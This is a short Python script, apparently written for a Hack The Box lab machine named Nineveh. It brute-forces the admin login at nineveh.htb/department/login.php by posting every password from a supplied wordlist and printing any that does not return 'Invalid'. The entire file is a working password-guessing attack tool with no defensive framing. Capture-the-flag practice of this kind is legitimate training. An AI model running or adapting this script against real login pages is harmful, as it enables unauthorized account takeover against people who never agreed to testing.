import urllib.request
import urllib.parse
import string
import sys 

def send_req(wordlist_path):
    # open wordlist
    file = open(wordlist_path,"r", errors='replace')
    lines = file.readlines()

    for password in lines:
        params = {'username': 'admin', 'password': password.rstrip()}
        f = urllib.parse.urlencode(params)
        f = f.encode('utf-8')

        req = urllib.request.Request("http://nineveh.htb/department/login.php", f)
        res = urllib.request.urlopen(req)

        data = res.read()

        if data.find(b'Invalid') > 0:
            pass
        else: 
            print ('Valid ! ' + password)

def main():
    if len(sys.argv) < 2:
        sys.exit('Usage : fuzz.py PATH/TO/WORDLIST ')
    
    data = send_req(sys.argv[1]) 



if __name__ == '__main__':
    main()
